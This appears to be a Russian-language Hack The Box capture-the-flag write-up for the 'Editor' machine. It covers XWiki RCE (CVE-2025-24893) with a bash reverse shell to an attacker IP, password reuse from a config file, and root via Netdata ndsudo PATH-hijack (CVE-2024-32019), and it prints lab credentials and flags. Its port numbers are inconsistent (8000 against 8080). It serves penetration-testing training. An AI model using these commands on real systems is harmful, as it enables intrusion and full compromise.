# 📝 Write-up: Editor (Hack The Box)

![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)

**Difficulty:** Easy
**Platform:** Hack The Box
**Target host (lab):** `editor.htb` — `10.10.11.80` (add to `/etc/hosts`)
**Link:** [Editor @ HTB](https://app.hackthebox.com/machines/Editor)

---

## 🎯 Summary

Editor — лёгкая Linux-машина. Ключевые шаги:

* Инициальный доступ через **XWiki RCE** (CVE-2025-24893).
* Горизонтальная эскалация: переиспользование пароля из конфигурации.
* Эскалация до root через уязвимый SUID-бинарь Netdata (CVE-2024-32019) с помощью PATH-hijack.

---

## 📋 Table of Contents

1. [Prerequisites / Notes](#-prerequisites--notes)
2. [Reconnaissance](#-reconnaissance)
3. [Enumeration](#-enumeration)
4. [Exploitation — Initial Foothold (XWiki)](#-exploitation--initial-foothold-xwiki)
5. [Privilege Escalation — User (password reuse)](#-privilege-escalation--user-password-reuse)
6. [Privilege Escalation — Root (Netdata ndsudo)](#-privilege-escalation--root-netdata-ndsudo)
7. [Mitigations & Lessons Learned](#-mitigations--lessons-learned)
8. [Replay / Reproduce checklist](#-replay--reproduce-checklist)
9. [References](#-references)

---

## 🔒 Prerequisites / Notes

* Это write-up для учебной (CTF/lab) среды Hack The Box — **не запускать против продакшн-систем**.
* В моих примерах `editor.htb` резолвится в `10.10.11.80`. Добавьте в `/etc/hosts`:

```bash
# add on атакующей машине
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```


---

## 🔍 Reconnaissance

Сначала — полный порт-скан `nmap`:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.80
```

Пример вывода (сокращённо):

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express server)
8080/tcp open  http    XWiki 14.10.5

```

---

## 🕵️ Enumeration

### 🌐 HTTP — порт 80

* Статическая страница с документацией проекта.

### 🌐 HTTP — порт 8000 (XWiki)

* На порту `8000` запущен XWiki 14.10.5 — уязвимая версия.



---

## 🚀 Exploitation — Initial Foothold (CVE-2025-24893, XWiki RCE)

**Цель:** получить обратный шелл из XWiki.

> Подготовьте listener на своей машине:

```bash
# на вашей машине (атакующей)
nc -lvnp 4444
```

**Запуск эксплойта** (пример, используемый эксплоит — [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)):

```bash
# на атакующей машине
python3 exploit.py -t http://editor.htb:8080 -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```

**Примечание:** замените `<YOUR_IP>` своим IP; порт `8080` — порт XWiki в моём nmap-скане. Если у вас в nmap указано иначе — используйте реальный порт.


---

## 🔼 Privilege Escalation — User (Password reuse)

После фута нашли конфигурацию XWiki с учётными данными базы данных.

**Файл:** `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

Эти же креды использовались для пользователя `oliver` по SSH:

```bash
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```

**User flag:** `bc2341152c638da4a05b91d91c1df26f`



---

## 🚀 Privilege Escalation — Root (CVE-2024-32019, Netdata `ndsudo`)

Netdata поставлялось с SUID-бинарём `ndsudo` в `opt/netdata` — анализ показал, что бинарь вызывает внешние утилиты без надёжного полного пути, что позволяет выполнить PATH-hijacking.

### Почему работает PATH-hijack

SUID-бинарь, запущенный от root, наследует переменные окружения (включая `PATH`) и выполняет дочерние программы без использования абсолютных путей. Если в начале PATH подставить папку с вашим «плохим» бинарём с именем ожидаемой утилиты — root выполнит ваш код.

### Эксплуатация — шаги

1. Создаём простой C-бинарь, поднимающий UID до 0 и открывающий шелл:

```bash
cat > /tmp/nvme-list.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int main(){ setuid(0); system("/bin/bash"); return 0; }
EOF

gcc /tmp/nvme-list.c -o /tmp/nvme-list
chmod +x /tmp/nvme-list
```

2. Подставляем `/tmp` в начало PATH и запускаем уязвимый скрипт:

```bash
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Если бинарь `ndsudo` искал `nvme-list` в PATH и нашёл `/tmp/nvme-list`, он выполнит его с правами root — вы получите root shell.

**Root flag:** `6d4d6c2368c3210994e624647c93119f`


---

## 🛡 Mitigations & Lessons Learned

* **Патчить XWiki** до версии, в которой закрыт CVE-2025-24893. Отключать публичный доступ к административным интерфейсам.
* **Не хранить чувствительные пароли в репозиториях/конфигурациях** в открытом виде; использовать секреты/обёртки.
* **Не оставлять SUID-бинарей без необходимости.** Обеспечивать, чтобы SUID-исполняемые файлы использовали абсолютные пути или очищали PATH.
* **Мониторинг и управление учётными записями** — уникальные пароли для сервисных и пользовательских учёток.

---


---

## 📚 References

* CVE-2025-24893 — XWiki RCE (exploit used: [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893))
* CVE-2024-32019 — Netdata ndsudo PATH-hijack (description & PoC)

---
